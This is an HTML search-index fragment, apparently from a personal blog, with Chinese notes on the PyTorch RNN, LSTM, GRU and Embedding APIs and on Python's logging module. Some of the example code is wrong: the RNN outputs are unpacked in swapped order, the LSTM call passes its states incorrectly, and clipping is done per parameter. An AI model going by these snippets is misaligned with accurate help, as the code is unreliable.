&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^2\space [hidden\space len,hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;一个句子有多少个单词，代表RNN进行多少次时间节点的运算&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;torchnnrnn&#34;&gt;torch.nn.RNN&lt;/h4&gt;
&lt;p&gt;而在pytorch中使用RNN的API如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.nn.RNN(input_size, hidden_size, num_layers)

# - input_size 表示嵌入向量的维度，例如100
# - hidden_size 表示隐层状态向量的维度，例如20
# - num_layers 表示隐层层数/线性层层数
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554621837.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;\&lt;/p&gt;
&lt;p&gt;通过此API创建一个RNN网络模型，然后模型的输入和刚才图中的&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;不一样，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是每个时间状态下的输入，而在pytorch中RNN模型的输入是不需要单步处理每个时间状态的输入的，只需要将整个输入数据feed到模型中，模型会自动处理每个时间状态的输入。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 模型的输入x_input, h_0; 输出h_t,out

# x_input:[seq len, batch, feature len]
# - seq len 表示每个句子的单词数
# - batch 表示多少个句子
# - feature len 表示每个单词的嵌入维度
# h_0:[layer, batch, hidden len] h_0可以不给
# - layer RNN线性层数
# - batch 
# - hidden len 表示隐层向量维度

# h_t的维度和h_0一样，代表最后一个时间节点的隐层状态
# out：[seq len, batch, hidden len]输出每一个时间节点的最后一层的隐层状态
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554637513.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;使用示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rnn = torch.nn.RNN(input_size=100, hidden_size=20, num_layers=2, batch_first=False)

x_input = torch.randn(5, 3, 100) # seq len, batch, feature len
h_0 = torch.randn(2, 3, 20) # layer len, batch, hidden len

h_n, out = rnn(x_input, h_0)

print(h_n.shape)  # torch.Size([5, 3, 20])
print(out.shape)  # torch.Size([2, 3, 20])
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;lstm&#34;&gt;LSTM&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.nn.LSTM(input_size, hidden_size, num_layers, bidirectional=False)

# - input_size: The number of expected features in the input x
# - hidden_size: The number of features in the hidden state h
# - bidirectional: 双向LSTM，默认为False

# 模型的输入
# x_input [seq len, batch, H_in] H_in=input_size
# h_0 [D*num_layers, batch, H_out] 双向D=2，单向D=1；H_out=hidden_size
# c_0 [D*num_layers, batch, H_cell] H_cell=hidden_size

# 模型的输出
# output [seq len, batch, D*H_out]
# h_n [D*num_layers, batch, H_out]
# c_n [D*num_layers, batch, H_cell]

# 示例
rnn = nn.LSTM(input_size=10, hidden_size=20, num_layers=2)
x_input = torch.randn(5, 3, 10) # seq len, batch, input_size
h_0 = torch.randn(2, 3, 20) # 1*num_layers, batch, hidden_size
c_0 = torch.randn(2, 3, 20) # 1*num_layers, batch, hidden_size
output, (h_n, c_n) = rnn(x_input, h_0, c_0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gru&#34;&gt;GRU&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.nn.GRU(input_size, hidden_size, num_layers, bidirectional=False)

# - input_size: The number of expected features in the input x
# - hidden_size: The number of features in the hidden state h
# - bidirectional: 双向GRU，默认为False

# 模型的输入
# x_input [seq len, batch, H_in] H_in=input_size
# h_0 [D*num_layers, batch, H_out] 双向D=2，单向D=1；H_out=hidden_size

# 模型的输出
# output [seq len, batch, D*H_out]
# h_n [D*num_layers, batch, H_out]

# 示例
rnn = nn.GRU(input_size=10, hidden_size=20, num_layers=2)
x_input = torch.randn(5, 3, 10) # seq len, batch, input_size
h_0 = torch.randn(2, 3, 20) # 1*num_layers, batch, hidden_size
output, h_n = rnn(x_input, h_0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;12-词嵌入&#34;&gt;12. 词嵌入&lt;/h3&gt;
&lt;h4 id=&#34;121-torchnnembedding&#34;&gt;12.1 torch.nn.Embedding&lt;/h4&gt;
&lt;p&gt;在torch中使用嵌入模型非常简单，是需要使用&lt;code&gt;torch.nn.Embedding(num_embeddings, embedding_dim)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;num_embeddings&lt;/strong&gt; [int]– size of the dictionary of embeddings&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;embedding_dim&lt;/strong&gt; [int] – the size of each embedding vector&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;padding_idx&lt;/strong&gt; [int] - 索引为padding_idx的词向量全部为0，把padding_idx设置为填充的值，如padding_idx=3，训练过程中索引为3的将始终设置为0，不进行参数更新，也就是说，为了便于模型训练需统一句子长度，对那些句子长度不够的句子进行填充，比如用值3进行填充，当用nn.Embedding()进行词向量嵌入时，对应的索引为3的向量将变为全为0的向量。这样就减少了填充值对模型训练的影响。例如：句子[2, 4, 5]和[1, 2, 7, 8, 9]，两个句子不一样长，那么在输入到模型的时候就可以转换为[2, 4, 5, 3, 3], [1, 2, 7, 8, 9]。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Embedding&lt;/code&gt;创建一个大的矩阵，矩阵的每一行代表一个单词，默认是随机初始化的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 整个字典一共有5个单词，每个单词向量的维度是20
embeds = torch.nn.Embedding(num_embeddings=5, embedding_dim=20)

# 读取一个词向量，output = embeds(input)
# - input: IntTensor或LongTensor的任意shape
# - output: (*, H),*代表input的shape，H=embeding_dim
input = torch.IntTensor([[0, 1, 2], [3, 4, 1]])  # torch.Size([2, 3])

output = embeds(input)
print(output.shape)  # torch.Size([2, 3, 20])
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;一般在NLP中创建Embedding字典放在网络模型之前，作为预处理，这些embedding默认是随机初始化的，但在训练的过程中会进行训练。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;除此之外，我们也可以导入已经训练好的词向量，但是需要设置训练过程中不更新：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;embeds.weight = torch.nn.Parameter(emb)
# 固定embedding
embeds.weight.requires_grad = False
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;13-attention&#34;&gt;13. Attention&lt;/h3&gt;
&lt;h3 id=&#34;14-其他常见操作&#34;&gt;14. 其他常见操作&lt;/h3&gt;
&lt;h4 id=&#34;141-扁平化操作&#34;&gt;14.1 扁平化操作&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Flatten(nn.Module):
    def __init__(self):
        super(Flatten, self).__init__()
        
    def forward(self, input):
        return input.view(input.size(0), -1)
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;142-torchmanual_seed&#34;&gt;14.2 torch.manual_seed()&lt;/h4&gt;
&lt;p&gt;在一个实验中，如果需要使用到随机数，由于每次实验都需要生成数据，设置随机种子是为了确保&lt;strong&gt;每次生成固定的随机数（生成的随机数是一样的）&lt;/strong&gt;，这就使得&lt;strong&gt;每次实验结果显示一致了&lt;/strong&gt;，有利于实验的比较和改进。使得每次运行该 python文件时生成的随机数相同。&lt;/p&gt;
&lt;p&gt;用比较学术的话来讲，torch.manual_seed()为 &lt;strong&gt;CPU/GPU&lt;/strong&gt; 中设置种子，生成随机数。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;t.manual_seed(1000)

def get_fake_data(batch_size=8):
    &#39;&#39;&#39;产生随机数据：y= x*2+3 , 加上一些噪声&#39;&#39;&#39;
    x = t.rand(batch_size,1)*20
    y = x * 2 +( 1 + t.randn(batch_size,1)) * 3
    return x,y

x , y = get_fake_data()
plt.scatter(x.squeeze().numpy(),y.squeeze().numpy())
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;143-梯度弥散和梯度爆炸&#34;&gt;14.3 梯度弥散和梯度爆炸&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;梯度弥散&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当网络的层数非常深时，会出现梯度非常小的问题，可能会接近于0，这样网络可能长时间得不到更新。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;梯度爆炸&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果梯度在某个过程中计算的值很大，再经历一系列的乘方会出现梯度非常大的情况，因此需要再计算的过程中检查梯度是否大于自定义的阈值，将其限制在阈值范围内，这个操作称为Gradient Clipping：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;loss = loss_fun(output, y)
model.zero_grad()
loss.backward()
for p in model.parameters():
    torch.nn.utils.clip_grad_norm_(p, 10)  # 限制在10的范围内
optimizer.step()
&lt;/code&gt;&lt;/pre&gt;
">【Pytorch】使用笔记</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/python-logging-ku/"" data-c="
          &lt;h3 id=&#34;日志等级&#34;&gt;日志等级&lt;/h3&gt;
&lt;p&gt;日志等级(level)：DEBUG/INFO/WARNING/ERROR/CRITICAL&lt;/p&gt;
&lt;p&gt;开发和部署时可以使用DEBUG或INFO级别的日志获取尽可能详细的日志信息来进行开发和部署调试；应用上线或部署生产环境，应该使用更高级别的日志来降低机器的I/O压力。&lt;/p&gt;
&lt;h3 id=&#34;使用方式&#34;&gt;使用方式&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;使用logging提供的模块级别函数&lt;/li&gt;
&lt;li&gt;使用logging日志系统的四大组件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;模块级别常用函数：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;logging.debug()&lt;/code&gt;、&lt;code&gt;logging.info()&lt;/code&gt;、&lt;code&gt;logging.warning()&lt;/code&gt;、&lt;code&gt;logging.error()&lt;/code&gt;、&lt;code&gt;logging.critical()&lt;/code&gt;、&lt;code&gt;logging.log()&lt;/code&gt;、&lt;code&gt;logging.basicConfig()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这些函数可以直接拿来调用，默认是使用root logger进行日志输出，其中&lt;code&gt;logging.log()&lt;/code&gt;创建一条严重级别的日志，&lt;code&gt;logging.basicConfig()&lt;/code&gt;是对root logger()进行&lt;strong&gt;一次性&lt;/strong&gt;(多次配置不会产生作用)配置，包括要记录的日志级别、日志格式、日志输出位置、日志文件的打开模式等信息。&lt;/p&gt;
&lt;p&gt;另外，日志器（Logger）是有层级关系的，上面调用的logging模块级别的函数所使用的日志器是RootLogger类的实例，其名称为root，它是处于日志器层级关系最顶层的日志器，且该实例是以单例模式存在的。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import logging

logging.debug(&amp;quot;This is a debug log.&amp;quot;)
logging.info(&amp;quot;This is a info log.&amp;quot;)
logging.warning(&amp;quot;This is a warning log.&amp;quot;)
logging.error(&amp;quot;This is a error log.&amp;quot;)
logging.critical(&amp;quot;This is a critical log.&amp;quot;)

# 默认的日志格式是：
# 日志级别:日志器名称:日志内容
LOG_FORMAT = &amp;quot;%(asctime)s - %(levelname)s - %(message)s&amp;quot;
logging.basicConfig(filename=&#39;my.log&#39;, level=logging.DEBUG, format=LOG_FORMAT)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;format格式：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字段/属性名称&lt;/th&gt;
&lt;th&gt;使用格式&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;asctime&lt;/td&gt;
&lt;td&gt;%(asctime)s&lt;/td&gt;
&lt;td&gt;日志事件发生的时间–人类可读时间，如：2003-07-08 16:49:45,896&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;created&lt;/td&gt;
&lt;td&gt;%(created)f&lt;/td&gt;
&lt;td&gt;日志事件发生的时间–时间戳，就是当时调用time.time()函数返回的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;relativeCreated&lt;/td&gt;
&lt;td&gt;%(relativeCreated)d&lt;/td&gt;
&lt;td&gt;日志事件发生的时间相对于logging模块加载时间的相对毫秒数（目前还不知道干嘛用的）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;msecs&lt;/td&gt;
&lt;td&gt;%(msecs)d&lt;/td&gt;
&lt;td&gt;日志事件发生事件的毫秒部分&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;levelname&lt;/td&gt;
&lt;td&gt;%(levelname)s&lt;/td&gt;
&lt;td&gt;该日志记录的文字形式的日志级别（‘DEBUG’, ‘INFO’, ‘WARNING’, ‘ERROR’, ‘CRITICAL’）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;levelno&lt;/td&gt;
&lt;td&gt;%(levelno)s&lt;/td&gt;
&lt;td&gt;该日志记录的数字形式的日志级别（10, 20, 30, 40, 50）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;name&lt;/td&gt;
&lt;td&gt;%(name)s&lt;/td&gt;
&lt;td&gt;所使用的日志器名称，默认是’root’，因为默认使用的是 rootLogger&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;message&lt;/td&gt;
&lt;td&gt;%(message)s&lt;/td&gt;
&lt;td&gt;日志记录的文本内容，通过 &lt;code&gt;msg % args&lt;/code&gt;计算得到的&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;pathname&lt;/td&gt;
&lt;td&gt;%(pathname)s&lt;/td&gt;
&lt;td&gt;调用日志记录函数的源码文件的全路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;filename&lt;/td&gt;
&lt;td&gt;%(filename)s&lt;/td&gt;
&lt;td&gt;pathname的文件名部分，包含文件后缀&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;module&lt;/td&gt;
&lt;td&gt;%(module)s&lt;/td&gt;
&lt;td&gt;filename的名称部分，不包含后缀&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lineno&lt;/td&gt;
&lt;td&gt;%(lineno)d&lt;/td&gt;
&lt;td&gt;调用日志记录函数的源代码所在的行号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;funcName&lt;/td&gt;
&lt;td&gt;%(funcName)s&lt;/td&gt;
&lt;td&gt;调用日志记录函数的函数名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;process&lt;/td&gt;
&lt;td&gt;%(process)d&lt;/td&gt;
&lt;td&gt;进程ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;processName&lt;/td&gt;
&lt;td&gt;%(processName)s&lt;/td&gt;
&lt;td&gt;进程名称，Python 3.1新增&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;thread&lt;/td&gt;
&lt;td&gt;%(thread)d&lt;/td&gt;
&lt;td&gt;线程ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;threadName&lt;/td&gt;
&lt;td&gt;%(thread)s&lt;/td&gt;
&lt;td&gt;线程名称&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;四大组件：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;组件名称&lt;/th&gt;
&lt;th&gt;对应类名&lt;/th&gt;
&lt;th&gt;功能描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;日志器&lt;/td&gt;
&lt;td&gt;Logger&lt;/td&gt;
&lt;td&gt;提供了应用程序可一直使用的接口&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;处理器&lt;/td&gt;
&lt;td&gt;Handler&lt;/td&gt;
&lt;td&gt;将logger创建的日志记录发送到合适的目的输出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;过滤器&lt;/td&gt;
&lt;td&gt;Filter&lt;/td&gt;
&lt;td&gt;提供了更细粒度的控制工具来决定输出哪条日志记录，丢弃哪条日志记录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;格式器&lt;/td&gt;
&lt;td&gt;Formatter&lt;/td&gt;
&lt;td&gt;决定日志记录的最终输出格式&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;其中&lt;strong&gt;日志器&lt;/strong&gt;就将日志信息输出到目标位置，&lt;strong&gt;处理器&lt;/strong&gt;就是指定输出位置的，&lt;strong&gt;日志器&lt;/strong&gt;可以设置多个&lt;strong&gt;处理器&lt;/strong&gt;将同一日志输出到不同的位置，每个&lt;strong&gt;处理器&lt;/strong&gt;都可以设置自己的&lt;strong&gt;过滤器&lt;/strong&gt;实现日志过滤，每个处理器也可以设置&lt;strong&gt;格式器&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;即日志器（logger）是入口，真正干活儿的是处理器（handler），处理器（handler）还可以通过过滤器（filter）和格式器（formatter）对要输出的日志内容做过滤和格式化等处理操作。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import logging
import colorlog

logging.basicConfig(level=logging.ERROR)

my_logger = logging.getLogger(__name__)
my_logger.setLevel(logging.DEBUG)
stream_handler = logging.StreamHandler()
formatter = colorlog.ColoredFormatter(
           &amp;quot;%(log_color)s%(levelname)1.1s %(asctime)s %(reset)s| %(message_log_color)s%(levelname)-8s %(reset)s| %(&amp;quot;
           &amp;quot;log_color)s[%(filename)s%(reset)s:%(log_color)s%(module)s%(reset)s:%(log_color)s%(funcName)s%(&amp;quot;
           &amp;quot;reset)s:%(log_color)s%(&amp;quot;&amp;quot;lineno)d] %(reset)s- %(white)s%(message)s&amp;quot;,
           reset=True,
           log_colors={
              &#39;DEBUG&#39;: &#39;cyan&#39;,
              &#39;INFO&#39;: &#39;green&#39;,
              &#39;WARNING&#39;: &#39;yellow&#39;,
              &#39;ERROR&#39;: &#39;red&#39;,
              &#39;CRITICAL&#39;: &#39;red&#39;,
           },
           secondary_log_colors={
               &amp;quot;message&amp;quot;: {
                   &amp;quot;DEBUG&amp;quot;: &amp;quot;blue&amp;quot;,
                   &amp;quot;INFO&amp;quot;: &amp;quot;blue&amp;quot;,
                   &amp;quot;WARNING&amp;quot;: &amp;quot;blue&amp;quot;,
                   &amp;quot;ERROR&amp;quot;: &amp;quot;red&amp;quot;,
                   &amp;quot;CRITICAL&amp;quot;: &amp;quot;bold_red&amp;quot;
               }
           },
           style=&amp;quot;%&amp;quot;
       )  # 日志输出格式
stream_handler.setFormatter(formatter)
my_logger.addHandler(stream_handler)
my_logger.propagate = False  # 关闭向父logger传递，避免重复输出

&lt;/code&gt;&lt;/pre&gt;
">【python】logging库</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-channel-yuan-li/"" data-c="
          &lt;h1 id=&#34;channel实现原理&#34;&gt;channel实现原理&lt;/h1&gt;
&lt;p&gt;协程A在执行过程中创建了子协程A1，A2... An，然后等待子协程执行完后退出，那么可以通过以下方式完成对子协程的控制：&lt;/p&gt;
&lt;ol&gt;
